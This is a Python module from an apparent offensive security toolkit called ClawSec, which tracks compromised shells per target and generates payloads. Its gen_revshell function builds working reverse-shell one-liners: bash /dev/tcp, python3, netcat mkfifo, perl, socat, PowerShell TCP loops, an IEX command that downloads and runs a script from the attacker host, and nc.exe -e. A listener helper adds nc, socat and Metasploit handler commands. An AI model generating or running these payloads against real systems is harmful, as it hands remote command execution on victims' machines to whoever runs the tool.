#!/usr/bin/env python3
"""
ClawSec Phase 2 — Shell Handler
Vertex Coders LLC

Tracks active shells obtained against a target, and the commands
executed in them. Useful for:
  - Reminding what user you have on which target
  - Building 'shell history per box' for the LLM advisor
  - Generating reverse shell payloads tailored to target OS

NOTE: This is metadata-only. ClawSec does NOT manage actual shell
sessions (use tmux, msfconsole, sliver, or manual nc -lvnp for that).
"""

from __future__ import annotations

import os
import sys
import datetime
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from phase2 import session as sess


# ── Reverse shell generators ──────────────────────────────────────────────────

def gen_revshell(lhost: str, lport: int, target_os: str = "linux", shell: str = "bash") -> dict:
    """Returns dict of payload-name → payload-string."""
    payloads: dict[str, str] = {}

    if target_os == "linux":
        payloads["bash_tcp"]    = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        payloads["bash_b64"]    = (
            "echo "
            f"'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' "
            "| base64 -w0; echo  # decode + bash on target"
        )
        payloads["python3"]     = (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        )
        payloads["nc_mkfifo"]   = (
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
        )
        payloads["perl"]        = (
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
            f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            f"exec(\"/bin/sh -i\");}};'"
        )
        payloads["socat_full"]  = f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"

    elif target_os == "windows":
        payloads["powershell_b64"] = (
            f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
            f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            f"$sendback = (iex $data 2>&1 | Out-String );"
            f"$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        )
        payloads["powershell_iex"] = (
            f"powershell -nop -ep bypass -c \"IEX(IWR http://{lhost}/rev.ps1 -UseBasicParsing)\""
        )
        payloads["nc_windows"]    = f"nc.exe -e cmd.exe {lhost} {lport}"
        payloads["nishang_oneliner"] = (
            f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$client.GetStream();[byte[]]$b = 0..65535|%{{0}};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$x=(iex $d 2>&1 | Out-String );$r = $x + 'PS ' + (pwd).Path + '> ';$by=([text.encoding]::ASCII).GetBytes($r);$s.Write($by,0,$by.Length);$s.Flush()}};$client.Close()\""
        )

    return payloads


def gen_listener_cmd(lport: int) -> dict:
    """Listener commands for the attacker box."""
    return {
        "ncat":       f"ncat -lnvp {lport}",
        "nc":         f"nc -lvnp {lport}",
        "rlwrap_nc":  f"rlwrap nc -lvnp {lport}  # arrow keys + readline support",
        "socat_pty":  f"socat file:`tty`,raw,echo=0 tcp-listen:{lport}",
        "msf":        f"use exploit/multi/handler\\nset PAYLOAD generic/shell_reverse_tcp\\nset LHOST 0.0.0.0\\nset LPORT {lport}\\nrun",
    }


# ── Shell tracking ────────────────────────────────────────────────────────────

def add_shell(target: str, user: str, method: str, lport: int = 0,
              notes: str = "") -> dict:
    s = sess.load(target)
    shell = {
        "id":         len(s["shells"]) + 1,
        "user":       user,
        "method":     method,           # "ssh", "reverse-bash", "winrm", "psexec", etc.
        "lport":      lport,
        "obtained_at": datetime.datetime.utcnow().isoformat() + "Z",
        "notes":      notes,
        "history":    [],
    }
    s["shells"].append(shell)
    sess.save(target, s)
    return shell


def add_command(target: str, shell_id: int, command: str, output_summary: str = "") -> None:
    s = sess.load(target)
    for sh in s["shells"]:
        if sh.get("id") == shell_id:
            sh.setdefault("history", []).append({
                "ts":      datetime.datetime.utcnow().isoformat() + "Z",
                "cmd":     command,
                "summary": output_summary[:200],
            })
            sess.save(target, s)
            return


def list_shells(target: str) -> list[dict]:
    return sess.load(target).get("shells", [])


# ── CLI ───────────────────────────────────────────────────────────────────────

def main() -> int:
    import argparse
    ap = argparse.ArgumentParser(description="ClawSec shell handler")
    ap.add_argument("target", help="Target IP/hostname")
    sub = ap.add_subparsers(dest="cmd", required=True)

    rs = sub.add_parser("revshell", help="Generate reverse shell payloads")
    rs.add_argument("--lhost", required=True)
    rs.add_argument("--lport", type=int, required=True)
    rs.add_argument("--os", default="linux", choices=["linux", "windows"])

    ls = sub.add_parser("listener", help="Generate listener command for attacker box")
    ls.add_argument("--lport", type=int, required=True)

    addsh = sub.add_parser("add", help="Register a shell you obtained")
    addsh.add_argument("--user", required=True)
    addsh.add_argument("--method", required=True)
    addsh.add_argument("--lport", type=int, default=0)
    addsh.add_argument("--notes", default="")

    sub.add_parser("list", help="List shells for target")

    args = ap.parse_args()

    if args.cmd == "revshell":
        payloads = gen_revshell(args.lhost, args.lport, args.os)
        print(f"# Reverse shell payloads — target_os={args.os}, lhost={args.lhost}, lport={args.lport}")
        print()
        for name, payload in payloads.items():
            print(f"## {name}")
            print(payload)
            print()
        return 0

    if args.cmd == "listener":
        cmds = gen_listener_cmd(args.lport)
        print(f"# Listeners for port {args.lport}")
        for name, cmd in cmds.items():
            print(f"# {name}")
            print(cmd)
            print()
        return 0

    if args.cmd == "add":
        sh = add_shell(args.target, args.user, args.method, args.lport, args.notes)
        print(f"✅ Shell registered: id={sh['id']} user={sh['user']} method={sh['method']}")
        return 0

    if args.cmd == "list":
        shells = list_shells(args.target)
        if not shells:
            print(f"(no shells registered for {args.target})")
            return 0
        for sh in shells:
            print(f"#{sh['id']} {sh.get('user','?')} via {sh.get('method','?')} "
                  f"obtained={sh.get('obtained_at','?')} cmds={len(sh.get('history',[]))}")
            if sh.get("notes"):
                print(f"   notes: {sh['notes']}")
        return 0

    return 1


if __name__ == "__main__":
    raise SystemExit(main())
